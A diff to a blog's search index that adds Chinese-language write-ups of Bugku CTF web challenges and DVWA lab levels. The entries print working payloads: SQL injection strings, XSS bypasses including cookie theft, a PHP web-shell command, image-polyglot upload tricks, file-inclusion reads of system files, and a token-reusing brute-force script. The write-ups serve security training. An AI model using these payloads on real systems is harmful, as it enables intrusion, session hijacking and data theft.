@@ -1,6 +1,47 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[bugku 17-20]]></title>
+    <url>%2F2019%2F03%2F14%2Fbugku-17-20%2F</url>
+    <content type="text"><![CDATA[一、第17题（输入密码查看flag）。暴力破解，可得密码，然后输入密码可得flag 二、 第18题(点击一百万次)查看源码可以发现，url以post的方式提交点击的次数，那么使用hacker的post功能，直接修改clicks=1000000,即可得出flag 三、第19题（备份是个好习惯）小知识：备份文件的扩展名一般为*.swp，.bak打开题目是一串字母，应该是MD5加密我们拿去解密下，竟然为空。看看题目的提示，备份是个好习惯，是让我们寻找 .bak文件的我们用御剑扫描后台，得出那么尝试下http://123.06.87.240:8002/web16/index.php.bak成功下载源码 &lt;?php /** * Created by PhpStorm. * User: Norse * Date: 2017/8/6 * Time: 20:22 */ include_once &quot;flag.php&quot;; ini_set(&quot;display_errors&quot;, 0); $str = strstr($_SERVER[&apos;REQUEST_URI&apos;], &apos;?&apos;);//代码从?后开始截取到str中，也就是变量后开始截取字符串 $str = substr($str,1);//取$str中左边第1位开始取1位。 $str = str_replace(&apos;key&apos;,&apos;&apos;,$str);//在字符串$str中找到字符串key，并把它替换成空； parse_str($str);//把查询字符串解析到变量中； echo md5($key1); echo md5($key2); if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2){ echo $flag.&quot;取得flag&quot;; } 代码要求我们构造出key1和key2的md5值相等，而它们本身却不相等，这时候用到一个小知识点：md5无法对数组进行构造，构造的结果都为NULL，这样我们只要让key1和key2是两个数组就可以了，（kekeyy绕过过滤key） 四、第20题（成绩单）在这里插入代码片我们先输入1发现输出输入-1发现没有输出信息说明存在sql注入。那么我们尝试下输入 -1&#39; union select 1,2,3,database()#发现flag的所在的数据库输入-1&#39; union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database()#爆出flag所在的表 输入-1&#39; union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=&#39;fl4g&#39;#爆出flag所在的字段 输入-1&#39; union select 1,2,3,skctf_flag from fl4g# 爆出flag为BUGKU{Sql_INJECT0N_4813drd8hz4}]]></content>
+      <categories>
+        <category>bugkuCTF</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[DVWA之xss]]></title>
+    <url>%2F2019%2F03%2F14%2FDVWA-xss%2F</url>
+    <content type="text"><![CDATA[一、反射（reflected）型（一）、尝试low等级输入正常数字，返回以下内容再输入&lt;xss&gt;发现，只输出了hello我们使用火狐的开发者工具查看下元素发现hello的后面是一对xss标签我们进行弹窗测试输入&lt;script&gt;alert(/xss/)&lt;/script&gt;发现弹窗，说明存在xss注入介绍javaScript的3个弹窗函数alert() ,confirm() ,prompt()攻击者思路攻击者web设计构造估计的js脚本 document.location就是页面的内容定位到指定的位置，他会访问参数中的地址，参数里面写上刚刚新建的php文件的网址，document.cookie就是赋值给这个php的cookie参数，这个cookie值最终会出现在网站127.0.0.1/cookie.php中构造并发送攻击url这样子还不行还需要url编码最后劫持会话修改cookie，修改为之前获取的cookie值。 （二）、尝试medium等级，只要在&lt;srcipt&gt;标签中插入一个&lt;script&gt;即可，&lt;src&lt;srcipt&gt;ipt&gt;，因为他过滤了&lt;sript&gt;标签其他步骤与low等级一样。（三）尝试high等级。上面的方法都失效了，那么我们想到了img标签也是可以执行js代码的 &lt;img src= x onerror=alert(1)&gt; 使用iframe标签也可以成功注入&lt;iframe onload=alert(1)&gt;说明只过滤了script标签（四）impose等级查看源码发现htmlspecialchars函数那么这是函数是干啥的呢？可以把 &amp;过滤成&amp;amp; &quot;过滤成&amp;quto; &apos;过滤成&amp;apos; &lt;过滤成&amp;lt; &gt;过滤成&amp;gt; 二、存储型（stored）反射（一）、尝试low等级，使用火狐浏览器开发者工具，发现name被限制为10个字符，message被限制为50个字符.这对我们xss注入是不够的。那么我们就抓包发送name,message参数成功绕过了限制存储型的数据是存在数据库里，大家可以选择setup/resetDB重置数据库，清楚数据（二）尝试medium等级发现name过滤alert ,和script标签，message过滤了script标签。尝试script大小写发现无法弹窗这个是部分源码我们尝试iframe标签 txtName=&lt;iframe onload=alert(/xss/)&gt;&amp;mtxMessage=&lt;iframe src =1 onload=alert(/ss/)&gt;&amp;btnSign=Sign+Guestbook 发现name成功弹窗,但是message不行，不过没关系，可以进行xss注入 （三）、尝试high等级和medium的方法一样，不同是high等级的message对&lt; &gt; “ &amp; ‘进行了处理（四）、尝试impose等级查看源码name和message都对&lt; &gt; \” &amp; \’进行了过滤 三、DOM型XSS（一）、尝试low等级我们尝试注入 http://localhost/DVWA/vulnerabilities/xss_d/?default=&lt;script&gt;alert(/hack/)&lt;/script&gt; 成功进行注入，查看源码发现，没有任何保护措施（二）、尝试medium等级发现low等级的方法已经失效了，经过尝试可以发现，script标签被过滤了，过滤成English。查看源码发现只过滤了script标签那么我们尝试 下&lt;img src= x onerror=alert(1)&gt;页面没有反应查看网页源代码，发现我们的语句被插入到了value值中，但是并没有插入到option标签的值中，使用img标签没有发挥作用我们尝试闭合option `http://localhost/DVWA/vulnerabilities/xss_d/?default= &gt;&lt;/option&gt;&lt;img src= x onerror=alert(1)`&gt; 发现还没没有闭合成功。我们闭合用的&gt;&lt;被闭合到option的值当中去了。那么我们往更高一层的select标签闭合 http://localhost/DVWA/vulnerabilities/xss_d/?default= &gt;&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert(&apos;hhh&apos;)&gt; 成功注入（三）、尝试high等级尝试了一番之后没有结果我们查看下源码，发现源码使用了白名单的方法，那我们是不是可以使用#注入，第一次从本地写入，第二次刷新的时候执行我们注入的xss http://localhost/DVWA/vulnerabilities/xss_d/?default=English#&lt;/option&gt;&lt;/select&gt;&lt;BODY ONLOAD=alert(document.cookie)&gt; 成功注入 （四）、impose等级发现我们输入什么都会在客户端体现，查看源码发现在客户端进行了保护。这段代码的功能是不会对URL输入进行URL编码过的内容再进行URL解码从而杜绝了DOM型XSS，这就是为什么我们输入什么就会在框中体现]]></content>
+      <categories>
+        <category>DVWA</category>
+      </categories>
+  </entry>
+  <entry>
+    <title><![CDATA[file upload]]></title>
+    <url>%2F2019%2F03%2F14%2Ffile-upload%2F</url>
+    <content type="text"><![CDATA[一、尝试low等级我们上传一个phpinfo.php文件，文件内容为&lt;?php echo pphpinfo()?&gt;,把路径拼接起来，输入 http://localhost/DVWA/hackable/uploads/phpinfo.php 成功获得执行我们上次的文件我们再上传个一句话木马文件然后直接尝试系统命令 http://localhost/DVWA/hackable/uploads/cmd.php ?cmd=system(&apos;net user&apos;); 二、尝试medium等级上传一句话木马文件，发现报错，只支持jpeg和png格式的图片那么我们抓包看看，上传成功和上传不成功的包有什么差别，然后就是不断的尝试，不端地把上传不成功的包与上传成功的不同之处改成和上传成功的包相同，然后重新发送，发现了破解的办法上传cmd.php文件，然后把文件类型改为imag/jpeg，重新发送就可以了。三、high等级前面的方法都不能用了。尝试了文件后缀名和文件内容发现都失败了那么我们就想到了”制作内涵图“，就是把文件和图片合并成一张图片在cmd窗口下用命令结合 copy 1.jpg/b +1.txt/a 2.jpg 结合成2.jpg我们用编辑器打开，在文件末尾发现了我们的一句话木马 那既然传上去了，那么我们要怎么用呢首先我们需要切换下服务器，切换成nginx在phpini配置文件里把下面这个参数改为一，默认是1然后输入http://localhost/DVWA//hackable/uploads/2.jpg/2.php即可上传]]></content>
+      <categories>
+        <category>bugkuCTF</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[file includes]]></title>
+    <url>%2F2019%2F03%2F14%2Ffile-includes%2F</url>
+    <content type="text"><![CDATA[一、前置知识1、什么是文件包含一种代码处理方法，函数如include,require等，参数是文件名。2、文件包含漏洞文件名的参数用户可控且过滤不严，被攻击者偷梁换柱 二、尝试low等级打开文件包含题目会发现以下提示，我们找到php.ini配置文件（一般在安装目录里），把 allow_url_include的值改成on，然后重启phpstudy即可The PHP function allow_url_include is not enabled我们点击文件一、文件2、文件3、发现了下图的规律。那么我们尝试下输入 http://localhost/DVWA/vulnerabilities/fi/?page=test.php 那么我们就可以利用这个漏洞了，输入 http://localhost/DVWA/vulnerabilities/fi/?page=..\..\php.ini ..\的意思是返回上一级目录。因为php.ini在DVWA目录下，所以使用..\..\ 直接输出了这个文件的内容 那么问题又来了，读取其他目录的php脚本会怎样，显示内容还是执行php代码 输入 http://localhost/DVWA/vulnerabilities/fi/?page=..\..\phpinfo.php 这说明了文件包含不仅仅显示内容还会执行文件。 那什么会执行远程文件吗？我们再次尝试可以执行并且非php文件里面只要包含php代码就可以执行 那么问题又来了。远程执行php文件和非php文件有什么差别吗？当然有了，以上面的phpinfo.php和phpinfo.txt为例，进行说明phpinfo.php是在攻击者的web服务器上执行，这毫无意义，我们期望的是在受害者的web服务器上执行，所以phpinfo.txt才是正解，（phpinfo.txt在受害者的web服务器上执行） 三、尝试medium等级用low等级的方法发现依然成功。但是他和low的等级有什么差别吗差别在于它过滤了../而low的等级没有。第一张图为low等级，第二张图为medium等级代码。可以发现差别在于str_place()函数他把我们传入的参数中的../和..\&quot;替换成了空。还有https://和http://替换成了空 那么medium等级的远程文件可以执行吗。当然可以了既然过滤了http://那么我们可以使用httphttp://://如下图 四、high等级我们尝试了medium等级的方法，进行本地文件执行发现以下错误经常一番尝试发现只执行以file开头的文件。那么这里就不得不提到file协议了 那么什么是files协议呢就是文本传输协议，访问本地计算机中的文件 输入 http://localhost/DVWA/vulnerabilities/fi/?page=file://F:\php\PHPTutorial\WWW\DVWA\phpinfo.php file://后面是本地路径，成功执行本地文件也可以查看系统文件 http://localhost/DVWA/vulnerabilities/fi/?page=file://C:\windows\win.ini 那么怎样进行远程文件执行呢medium方法不可以，查看源码，可知用fnmatch()函数限制参数文件的开头进入impose等级那么要如何远程执行呢，要就有把文件放在图片里，然后上传到web服务器，怎么把文件放在图片里这篇博客里的high等级部分说明了]]></content>
+      <categories>
+        <category>bugkuCTF</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[Brute Force]]></title>
     <url>%2F2019%2F03%2F09%2FBrute-Force%2F</url>
     <content type="text"><![CDATA[一、 第一题先从难度是low的开始。我们尝试了下admin’# 直接把密码注释掉，成功破解。我们尝试下medium等级还是尝试了下admin’#，发现密码错误，看来这个漏洞被防护了 首先我们抓包看下http请求头的信息，发现可以在http头部看到看到我们提交的账号密码，既然这样我们使用owasp zap 软件暴力破解。这是我使用的字典，大家可以去百度搜索更多的字典暴力成功破解出账号密码。下面我们尝试high等级，发抓包发现多了个user_token(它的职责是保护用户的用户名及密码多次提交，以防密码泄露。)且每一次的user_take会被记录到下一次请求头里的referrer里。这样上面的方法我们就不能使用了。但是认真观察，我们可以发现第一次进登录页面是没有user_token，这就是突破口。那么就可以一直在登录界面和第一次登录进行破解。还有一种思路是虽然加了user_token,但是并没有对尝试的次数进行限制，我们可以先获取user_token，然后用user_token加上用户密码验证身份。我们使用python脚本自动化爆力破解(第二种思路)。 from bs4 import BeautifulSoup import requests header={ &apos;GET&apos;: &apos;http://localhost/DVWA/vulnerabilities/brute/ HTTP/1.1&apos;, &apos;User-Agent&apos;:&apos;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0&apos;, &apos;Accept&apos;:&apos;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&apos;, &apos;Accept-Language&apos;:&apos;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&apos;, &apos;Referer&apos;:&apos;http://localhost/DVWA/vulnerabilities/brute/&apos;, &apos;cookie&apos;:&apos;PHPSESSID=8fbhto539r4fnjt4dduolvikj3; security=high&apos;, &apos;Connection&apos;:&apos;keep-alive&apos;, &apos;Upgrade-Insecure-Requests&apos;:&apos;1&apos;, &apos;Host&apos;:&apos;127.0.0.1&apos; } requrl=&quot;http://127.0.0.1/DVWA/vulnerabilities/brute/&quot; def get_token(requrl,header): response=requests.get(url=requrl,headers=header) print (response.status_code,len(response.content)) soup=BeautifulSoup(response.text,&quot;html.parser&quot;) input=soup.form.select(&quot;input[type=&apos;hidden&apos;]&quot;) #返回的是一个list列表 user_token=input[0][&apos;value&apos;] #获取用户的token return user_token user_token=get_token(requrl,header) i=0 for line in open(&quot;password.txt&quot;): requrl=&quot;http://127.0.0.1/DVWA/vulnerabilities/brute/?username=admin&amp;password=&quot;+line.strip()+&quot;&amp;Login=Login&amp;user_token=&quot;+user_token i=i+1 print (i , &apos;admin&apos; ,line.strip(),end=&quot; &quot;) user_token=get_token(requrl,header) # 尝试次数 if(i==20): break ) 我们继续查看impose等级，发现输错3次就被限制15分钟无法登入。那么还有什么是可以防止暴力破解的呢？还有验证码。]]></content>
